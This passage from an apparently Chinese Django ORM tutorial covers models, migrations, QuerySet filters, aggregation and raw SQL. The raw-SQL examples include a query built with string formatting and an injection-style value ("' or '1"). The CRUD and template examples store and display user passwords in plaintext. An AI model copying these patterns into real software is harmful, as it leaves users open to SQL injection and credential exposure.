述对象和数据库之间映射的元数据，⾃动⽣成sql语句，将程序中的对象⾃动保存 到关系数据库中。</p><p><strong>优点：</strong></p><ul><li>隐藏了数据库访问的细节，简化了sql的使⽤，提⾼了开发效率 </li><li>解耦业务逻辑层（view）和数据处理层（model)，简化了开发流程，提⾼了 系统的可移植性 </li><li>提⾼了安全性</li></ul><p><strong>优点：</strong></p><ul><li>执⾏效率低 </li><li>对复杂sql⽆能为⼒ </li><li>增加了学习成本</li></ul><p><img src="https://img.xpctf.cn/img/20201015202706.png"></p><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><table><thead><tr><th align="center">⾯向对象概念</th><th align="center">⾯向关系概念</th></tr></thead><tbody><tr><td align="center">类</td><td align="center">表</td></tr><tr><td align="center">对象</td><td align="center">记录(一行)</td></tr><tr><td align="center">属性</td><td align="center">字段(属性，列)</td></tr></tbody></table><ul><li>一个模型类对应一个表</li><li>每个模型都必须继承django.db.models.Model</li></ul><h3 id="模型属性"><a href="#模型属性" class="headerlink" title="模型属性"></a>模型属性</h3><p>模型中的属性和数据库表的字段对应，必须定义。模型的属性需要定义成类属性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#属性定义语法为：</span></span><br><span class="line">属性 = models.字段类型(选项)</span><br></pre></td></tr></table></figure><ul><li>属性命名规则<br>- 不能是python的保留关键字<br>- 不允许使⽤连续的下划线，因为连续下划线在查询中会⽤到<br>- 定义属性时需要指定字段类型<br>- 主键⼀般不⽤⾃⼰定义，django会⾃动创建⾃增⻓主键列，如果你⾃⼰定 义了主键，则django不会再⾃动⽣成主键</li></ul><h4 id="字段类型"><a href="#字段类型" class="headerlink" title="字段类型"></a>字段类型</h4><table><thead><tr><th align="center">字段名称</th><th align="center">字段说明</th><th align="center">参数</th></tr></thead><tbody><tr><td align="center">AutoField</td><td align="center">⼀个根据实际Id⾃动增⻓的 IntegerField（通常不指定 ⾃动 ⽣成）</td><td align="center">primary_key:bool 是否为主键</td></tr><tr><td align="center">CharField</td><td align="center">字符串，默认的表单样式是 TextInput</td><td align="center">max_length&#x3D;字符⻓ 度</td></tr><tr><td align="center">TextField</td><td align="center">⼤⽂本字段，⼀般超过4000使 ⽤，默认的表单控件是 Textarea</td><td align="center"></td></tr><tr><td align="center">IntegerField</td><td align="center">整数</td><td align="center"></td></tr><tr><td align="center">DecimalField</td><td align="center">使⽤python的Decimal实例表 示的⼗进制浮点数</td><td align="center"></td></tr><tr><td align="center">FloatField</td><td align="center">⽤Python的float实例来表示的 浮点数</td><td align="center"></td></tr><tr><td align="center">BooleanField</td><td align="center">true&#x2F;false 字段，此字段的默认 表单控制是CheckboxInput</td><td align="center"></td></tr><tr><td align="center">NullBooleanField</td><td align="center">⽀持null、true、false三种值</td><td align="center"></td></tr><tr><td align="center">DateField</td><td align="center">使⽤Python的datetime.date实 例表示的⽇期，该字段默认对 应的表单控件是⼀个TextInput</td><td align="center">auto_now和 auto_now_add、 default这三个参数 不能同时共存</td></tr><tr><td align="center">TimeField</td><td align="center">使⽤Python的datetime.time实 例表示的时间</td><td align="center">参数同DateField</td></tr><tr><td align="center">DateTimeField</td><td align="center">使⽤Python的 datetime.datetime实例表示的 ⽇期和时间</td><td align="center">参数同DateField</td></tr><tr><td align="center">ImageField</td><td align="center">继承了FileField的所有属性和⽅ 法，但对上传的对象进⾏校 验，确保它是个有效的image</td><td align="center"></td></tr></tbody></table><ul><li>auto_now: 每次保存对象时，⾃动设置该字段为当前时间，⽤于”最后⼀次修 改”的时间戳，它总是使⽤当前⽇期，默认为false</li><li>auto_now_add: 当对象第⼀次被创建时⾃动设置当前时间，⽤于创建的时间 戳，它总是使⽤当前⽇期，默认为false</li></ul><h3 id="字段选项"><a href="#字段选项" class="headerlink" title="字段选项"></a>字段选项</h3><p>适⽤于任何字段，可以实现字段的约束，在⽣成字段时通过⽅法的关键字参数指 定。</p><table><thead><tr><th align="center">可选参数</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">null</td><td align="center">如果 True ，Django将 NULL 在数据库中存储空值。默认 是 False 。不要在字符串字段上使⽤。null是数据库范畴的概 念</td></tr><tr><td align="center">blank</td><td align="center">如果 True ，该字段允许为空。默认是 False 。同null不同， 如果字段有 blank&#x3D;True ，则表单验证将允许输⼊空值。如果 字段有 blank&#x3D;False ，则需要该字段。</td></tr><tr><td align="center">db_column</td><td align="center">⽤于此字段的数据库列的名称。如果没有给出，Django将使 ⽤该字段的名称。</td></tr><tr><td align="center">db_index</td><td align="center">如果 True ，将为此字段创建数据库常规索引。</td></tr><tr><td align="center">unique</td><td align="center">如果 True ，该字段在整个表格中必须是唯⼀的。</td></tr><tr><td align="center">primary_key</td><td align="center">如果 True ，此字段是模型的主键。</td></tr><tr><td align="center">default</td><td align="center">默认值 当前字段如果不给值则执⾏默认值</td></tr></tbody></table><h2 id="定义模型"><a href="#定义模型" class="headerlink" title="定义模型"></a>定义模型</h2><p>我们可以在应⽤的models.py中定义模型：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">模型名</span>(models.Model):</span><br><span class="line"> 属性名 = models.字段名(字段选项/参数)</span><br><span class="line"> .....</span><br><span class="line"> <span class="keyword">class</span> <span class="title class_">Meta</span>: <span class="comment">#可选，任何⾮字段的设置可以写到Meta中</span></span><br><span class="line"> db_table = <span class="string">&#x27;user&#x27;</span> <span class="comment">#指定表名为uesr</span></span><br></pre></td></tr></table></figure><ul><li>数据库的表名等于：应⽤名_模型名，如果想指定表名，可以在Meta中使⽤ db_table指定</li><li>如果没有指定主键，Django将⾃动给表创建⼀个⾃增⻓主键，名为id</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">id</span> = models.AutoField(primary_key=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><ul><li>Meta中常⽤设置：</li></ul><table><thead><tr><th align="center">名称</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">db_table</td><td align="center">数据库中的表名</td></tr><tr><td align="center">abstract</td><td align="center">当设置为True时，说明当前模型是抽象基类</td></tr><tr><td align="center">managed</td><td align="center">如果设置False，则迁移不会创建或删除表，默认是True</td></tr><tr><td align="center">ordering</td><td align="center">⽤于记录排序，ordering &#x3D; [‘pub_date’]或降序ordering &#x3D; [‘- pub_date’]</td></tr></tbody></table><h2 id="激活模型"><a href="#激活模型" class="headerlink" title="激活模型"></a>激活模型</h2><ul><li>创建迁移⽂件 （此刻表并没有创建到库中）</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python manage.py makemigrations</span><br></pre></td></tr></table></figure><ul><li>执⾏迁移 （将模型创建到库中）</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python manage.py migrate</span><br></pre></td></tr></table></figure><p>然后在应⽤的migrations⽬录中应该⽣成了迁移⽂件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">├── app</span><br><span class="line">│ ├── admin.py</span><br><span class="line">│ ├── apps.py</span><br><span class="line">│ ├── __init__.py</span><br><span class="line">│ ├── migrations</span><br><span class="line">│ │ ├── 0001_initial.py</span><br><span class="line">│ │ ├── __init__.py</span><br></pre></td></tr></table></figure><p><strong>注意：</strong>任何对字段或表的修改都需要重新迁移</p><ul><li>反向迁移 可以根据数据库中表⾃动创建模型</li></ul><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python manage.py inspectdb &gt; App/models.py</span><br></pre></td></tr></table></figure><h2 id="模型的使用"><a href="#模型的使用" class="headerlink" title="模型的使用"></a>模型的使用</h2><p>我们可以在交互式Python shel环境中，使⽤Django提供的免费API。要调⽤ Python shell，请使⽤以下命令：</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ py -<span class="number">3</span> manage.py shell</span><br><span class="line">Python <span class="number">3</span>.<span class="number">6</span>.<span class="number">8</span> (tags/v3.<span class="number">6</span>.<span class="number">8</span>:<span class="number">3</span>c6b436a57, Dec <span class="number">24</span> <span class="number">2018</span>, <span class="number">00</span>:<span class="number">16</span>:<span class="number">47</span>) [MSC v.<span class="number">1916</span> <span class="number">64</span> bit (AMD64)] on win32</span><br><span class="line"><span class="built_in">Type</span> &quot;<span class="built_in">help</span>&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; <span class="keyword">for</span> <span class="built_in">more</span> information.</span><br><span class="line">(InteractiveConsole)</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="增删改"><a href="#增删改" class="headerlink" title="增删改"></a>增删改</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sql</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="comment"># 增</span></span><br><span class="line">    user = User(username=<span class="string">&#x27;admin&#x27;</span>,password=<span class="string">&#x27;123456&#x27;</span>)</span><br><span class="line">    user.save()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 第二种增</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123456&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    User.objects.create(**data)</span><br><span class="line">    <span class="comment"># 改</span></span><br><span class="line">    user = User.objects.get(pk=<span class="number">1</span>)</span><br><span class="line">    user.password = <span class="string">&#x27;654321&#x27;</span></span><br><span class="line">    user.save()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 删</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        user = User.objects.get(pk=<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> user:</span><br><span class="line">            user.delete()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> error:</span><br><span class="line">        <span class="built_in">print</span>(error)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&quot;操作完成&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li><p>数据的逻辑删除</p><p>对于重要数据，⼀般不会直接删除，会在表中增加⼀个字段⽐如： is_deleted，如果删除的话，将这个字段置为True，以后查询的时候不在查 询，这种操作称为<strong>逻辑删除</strong></p></li></ul><h3 id="数据查询"><a href="#数据查询" class="headerlink" title="数据查询"></a>数据查询</h3><h4 id="过滤器查询"><a href="#过滤器查询" class="headerlink" title="过滤器查询"></a>过滤器查询</h4><p>要从数据库检索数据，⾸先要获取⼀个查询集(QuerySet)，查询集表示从数据库获<br>取的对象集合，它可以有零个，⼀个或多个过滤器。返回查询集的⽅法，称为过滤<br>器，过滤器根据给定的参数缩⼩查询结果范围，相当于sql语句中where或limit。</p><ul><li>在管理器上调⽤过滤器⽅法会返回查询集 </li><li>查询集经过过滤器筛选后返回新的查询集，因此可以写成链式过滤 </li><li><strong>惰性执行</strong>：创建查询集不会带来任何数据库的访问，直到调⽤数据时，才会访问数据库 </li><li>以下对查询集求值：迭代、切⽚、序列化、与if合⽤、 repr()&#x2F;print()&#x2F;len()&#x2F;list()&#x2F;bool()</li></ul><p>遍历数据库所有数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">user_list</span>(<span class="params">request</span>):</span><br><span class="line">    users = User.objects.<span class="built_in">all</span>()</span><br><span class="line">    <span class="keyword">return</span> render(request,<span class="string">&#x27;list.html&#x27;</span>,<span class="built_in">locals</span>())</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>用户列表<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1&quot;</span> <span class="attr">width</span>=<span class="string">&quot;200px&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>用户名<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>密码<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            &#123;% for user in users %&#125;</span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span> <span class="attr">align</span>=<span class="string">&quot;center&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; user.username &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; user.password &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            &#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>过来取可串联使用，比如：<code>users = User.objects.filter(username=&#39;Mxm7788&#39;, password=&#39;1&#39;).filter(id=5)</code></p><p>实现mysql limit功能显示前10条：<code>User.objects.all()[:10]</code></p><p>实现mysql limit功能显示5-10条：<code>User.objects.all()[4:11]</code></p><p><strong>注意：</strong>Python切片包头不包尾</p><table><thead><tr><th align="center">管理器的⽅法</th><th align="center">返回类型</th><th align="center">说明</th></tr></thead><tbody><tr><td align="center">模型类.objects.all()</td><td align="center">QuerySet</td><td align="center">返回表中所有数据</td></tr><tr><td align="center">模型类.objects.filter()</td><td align="center">QuerySet</td><td align="center">返回符合条件的数据,相当于where</td></tr><tr><td align="center">模型 类.objects.exclude()</td><td align="center">QuerySet</td><td align="center">返回不符合条件的数据</td></tr><tr><td align="center">模型 类.objects.order_by()</td><td align="center">QuerySet</td><td align="center">对查询结果集进⾏排序</td></tr><tr><td align="center">模型 类.objects.values()</td><td align="center">QuerySet</td><td align="center">返回⼀个Queryset，其中每个对象为⼀个字典</td></tr><tr><td align="center">模型 类.objects.values_list()</td><td align="center">QuerySet</td><td align="center">和values()基本相同，但每个对象是⼀个元组</td></tr><tr><td align="center">模型 类.objects.reverse()</td><td align="center">QuerySet</td><td align="center">对排序的结果反转</td></tr><tr><td align="center">模型类.objects.only(字段)</td><td align="center">QuerySet</td><td align="center">只显示指定字段</td></tr><tr><td align="center">模型 类.objects.defer(字段)</td><td align="center">QuerySet</td><td align="center">去除指定字段</td></tr><tr><td align="center">模型类.objects.get()</td><td align="center">模型对象</td><td align="center">返回⼀个满⾜条件的对象； 如果没有找到符合条件的对象，会引发模 型类.DoesNotExist异常; 如果找到多个，会引发模型 类.MultiObjectsReturned 异常</td></tr><tr><td align="center">模型类.objects.first()</td><td align="center">模型对象</td><td align="center">返回第⼀条数据</td></tr><tr><td align="center">模型类.objects.last()</td><td align="center">模型对象</td><td align="center">返回最后⼀条数据</td></tr><tr><td align="center">模型 类.objects.earliest()</td><td align="center">模型对象</td><td align="center">根据指定字段返回最早增加的记录</td></tr><tr><td align="center">模型 类.objects.latest(field)</td><td align="center">模型对象</td><td align="center">根据field字段返回最近增加记录</td></tr><tr><td align="center">模型类.objects.exists()</td><td align="center">bool</td><td align="center">判断查询的数据是否存在</td></tr><tr><td align="center">模型类.objects.count()</td><td align="center">int</td><td align="center">返回查询集中对象的数⽬</td></tr></tbody></table><h4 id="非过滤器查询"><a href="#非过滤器查询" class="headerlink" title="非过滤器查询"></a>非过滤器查询</h4><p>.get非过滤器查询只能返回一条数据，返回一条或不返回都会报错。</p><p>查询结果集中记录数：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 返回类型必须是QuerySet才能调用count</span></span><br><span class="line">articles = myarticle.objects.<span class="built_in">all</span>()</span><br><span class="line">count = articles.count()</span><br></pre></td></tr></table></figure><p>查询结果集中是否有记录：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开发很常用，用于避免错误处理</span></span><br><span class="line">flag = myarticle.objects.<span class="built_in">filter</span>(<span class="built_in">id</span>=<span class="number">0</span>).exists()</span><br><span class="line"><span class="built_in">print</span> (flag)</span><br></pre></td></tr></table></figure><h4 id="filter查询"><a href="#filter查询" class="headerlink" title="filter查询"></a>filter查询</h4><p>相当于sql语句中where⼦句，在传参是无法使用关系运算符，它可以为ﬁlter、exclude和get⽅法提供参数。</p><p>基础语法：</p><p><code>属性名称__⽐较运算符=值   #是两个下划线 </code></p><p>filter支持多个条件查询，使用英文逗号分割多个条件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myarticle.objects.<span class="built_in">filter</span>(id__lt=<span class="number">50</span>, id__gte=<span class="number">20</span>)</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">操作符</th><th align="left">含义</th><th></th></tr></thead><tbody><tr><td align="left">&#x3D;或exact</td><td align="left">精确判等</td><td>name&#x3D;’admin’</td></tr><tr><td align="left">iexact</td><td align="left">不区分⼤⼩写判等</td><td>name__iexact&#x3D;’Admin’</td></tr><tr><td align="left">gt</td><td align="left">大于</td><td>uid__gt&#x3D;5</td></tr><tr><td align="left">gte</td><td align="left">大于等于</td><td>uid__gte&#x3D;5</td></tr><tr><td align="left">lt</td><td align="left">小于</td><td>uid__lt&#x3D;5</td></tr><tr><td align="left">lte</td><td align="left">小于等于</td><td>uid__lte&#x3D;5</td></tr><tr><td align="left">contains</td><td align="left">模糊查询，等价like ‘% 值%’</td><td>name__contains&#x3D;’Ad’</td></tr><tr><td align="left">icontains</td><td align="left">不区分⼤⼩写的模糊查 询</td><td>name__icontains&#x3D;’ad’</td></tr><tr><td align="left">startswith</td><td align="left">以什么开头</td><td>name__startswith&#x3D;’a’</td></tr><tr><td align="left">istartswith</td><td align="left">不区分⼤⼩写的以什么开头</td><td>name__istartswith&#x3D;’A’</td></tr><tr><td align="left">endswith</td><td align="left">以什么结尾</td><td>name__endswith&#x3D;’n’</td></tr><tr><td align="left">iendswith</td><td align="left">不区分⼤⼩写的以什么结尾</td><td>name__iendswith&#x3D;’N’</td></tr><tr><td align="left">isnull</td><td align="left">判空，是否为空(等价 &#x3D; None)</td><td>name__isnull&#x3D;True</td></tr><tr><td align="left">in</td><td align="left">包含</td><td>uid__in &#x3D; [1,2,3] #in后⾯必须是可迭 代对象</td></tr><tr><td align="left">regex</td><td align="left">正则匹配</td><td>uname__regex&#x3D; r’^a</td></tr><tr><td align="left">iregex</td><td align="left">不区分大小写的正则匹配</td><td>uname__iregex&#x3D; r’^a</td></tr></tbody></table><h3 id="统计查询"><a href="#统计查询" class="headerlink" title="统计查询"></a>统计查询</h3><p>需要先导⼊模块：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from django.db.models import Max,Min,Sum,Avg,Count</span><br></pre></td></tr></table></figure><ul><li>聚合查询：对多⾏查询结果的⼀列进⾏操作</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#统计记录总数： select count(*) from user </span></span><br><span class="line">User.objects.aggregate(Count(<span class="string">&#x27;uid&#x27;</span>))    <span class="comment">#&#123;&#x27;uid__count&#x27;: 4&#125; </span></span><br><span class="line">User.objects.aggregate(Max(<span class="string">&#x27;uid&#x27;</span>))      <span class="comment">#&#123;&#x27;uid__max&#x27;: 5&#125; </span></span><br><span class="line">User.objects.aggregate(Min(<span class="string">&#x27;uid&#x27;</span>))      <span class="comment">#&#123;&#x27;uid__min&#x27;: 2&#125;</span></span><br></pre></td></tr></table></figure><ul><li>分组统计</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#等价sql: select type,count(*) from user group by type</span></span><br><span class="line">res = User.objects.values(<span class="string">&#x27;type&#x27;</span>).annotate(Count(<span class="string">&#x27;uid&#x27;</span>))</span><br><span class="line"><span class="comment">#统计结果： [&#123;&#x27;type&#x27;: &#x27;普通⽤户&#x27;, &#x27;uid__count&#x27;: 3&#125;, &#123;&#x27;type&#x27;: &#x27;超级管理</span></span><br><span class="line">员<span class="string">&#x27;, &#x27;</span>uid__count<span class="string">&#x27;: 1&#125;]</span></span><br><span class="line"><span class="string">#查看⽣成的sql语句</span></span><br><span class="line"><span class="string">print(res.query)</span></span><br><span class="line"><span class="string">#SELECT `user`.`type`, COUNT(`user`.`uid`) AS `uid__count` FROM</span></span><br><span class="line"><span class="string">`user` GROUP BY `user`.`type` ORDER BY NULL</span></span><br></pre></td></tr></table></figure><h3 id="Q对象和F对象"><a href="#Q对象和F对象" class="headerlink" title="Q对象和F对象"></a>Q对象和F对象</h3><p>需要先导⼊模块：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db.models <span class="keyword">import</span> Q,F</span><br></pre></td></tr></table></figure><ul><li>Q对象可以对关键字参数进⾏封装，从⽽更好的应⽤多个查询，可以组合&amp; (and)、|(or)、~(not)操作符。</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#原⽣sql:select * from user where uid = 2 or uid = 3</span></span><br><span class="line">User.objects.<span class="built_in">filter</span>(Q(uid=<span class="number">2</span>)|Q(uid=<span class="number">3</span>))</span><br><span class="line">User.objects.<span class="built_in">filter</span>(Q(uid__gte=<span class="number">2</span>) &amp; Q(uid__lte=<span class="number">3</span>))</span><br><span class="line">User.objects.<span class="built_in">filter</span>(~Q(uid__gte=<span class="number">2</span>))</span><br></pre></td></tr></table></figure><ul><li>F对象：⽤于⽐较表中两个字段</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#等价sql：select * from user where uid &lt; type</span></span><br><span class="line">User.objects.<span class="built_in">filter</span>(uid__lte = F(<span class="string">&#x27;type&#x27;</span>))</span><br></pre></td></tr></table></figure><h3 id="原始sql"><a href="#原始sql" class="headerlink" title="原始sql"></a>原始sql</h3><p>您可以使⽤它 模块类.objects.raw()来执⾏原始查询并返回模型实例，或者您可以完全避免模型层并直接执⾏⾃定义SQL。</p><p>使用原始sql语句可以执行任何sql语句(必须包含主键)，和模型无关。</p><ul><li>raw执行sql语句</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">users = User.objects.raw(<span class="string">&quot;select * from user&quot;</span>)</span><br><span class="line">users = User.objects.raw(<span class="string">&quot;select * from user where</span></span><br><span class="line"><span class="string">username=&#x27;&#123;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(<span class="string">&#x27;单强&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;select * from user where username=&#x27;&#123;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(<span class="string">&#x27;单强&#x27;</span>))</span><br><span class="line">users = User.objects.raw(<span class="string">&quot;select * from user where</span></span><br><span class="line"><span class="string">username=&#x27;&#123;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(<span class="string">&#x27;单强&#x27;</span>))</span><br><span class="line">users = User.objects.raw(<span class="string">&quot;select * from user where username=%s&quot;</span>,</span><br><span class="line">[<span class="string">&quot;sddfsdf&#x27; or &#x27;1&quot;</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(users))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(users))</span><br></pre></td></tr></table></figure><ul><li>⾃定义sql</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> connection</span><br><span class="line"><span class="comment"># with语句相当与cursor= connection.cursor() 和 cursor.close(),简化了语</span></span><br><span class="line"><span class="keyword">with</span> connection.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line"> cursor.execute(<span class="string">&quot;UPDATE bar SET foo = 1 WHERE baz = %s&quot;</span>,</span><br><span class="line">[para])</span><br><span class="line"> cursor.execute(<span class="string">&quot;SELECT foo FROM bar WHERE baz = %s&quot;</span>, [para2])</span><br><span class="line"> row = cursor.fetchone()</span><br><span class="line"><span class="comment"># 返回列表套字典</span></span><br><span class="line"><span class="keyword">with</span> connection.cursor() <span class="keyword">as</span> cursor:</span><br><span class="line">cursor.execute(<span class="string">&quot;select * from publisher&quot;</span>)</span><br><span class="line">columns = [col[<span class="number">0</span>] <span class="keyword">for</span> col <span class="keyword">in</span> cursor.description]</span><br><span class="line">res = [<span class="built_in">dict</span>(<span class="built_in">zip</span>(columns, row)) <span class="keyword">for</span> row <span class="keyword">in</span> cursor.fetchall()]</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><h2 id="模型成员"><a href="#模型成员" class="headerlink" title="模型成员"></a>模型成员</h2><p>模型类和数据库中表对应，模型类的对象和记录对象，模型类本身没有数据库访问 功能，但模型类中有⼀个Manager类的对象，通过管理器对象可以实现和数据库的 访问。</p><p>当我们没有为模型类定义管理器时，Django会为模型类⽣成⼀个名为objects的管 理器，⾃定义管理器后，Django不再⽣成默认管理器objects。</p><p>管理器是Django的模型进⾏数据库操作的接⼝，Django应⽤的每个模型都拥有⾄ 少⼀个管理器。Django⽀持⾃定义管理器类，继承⾃models.Manager。</p><p>⾃定义管理器类主要⽤于两种情况：</p><ul><li>修改原始查询集 </li><li>向管理器类中添加额外的⽅法，如向数据库中插⼊数据。</li></ul><h3 id="重命名管理器"><a href="#重命名管理器" class="headerlink" 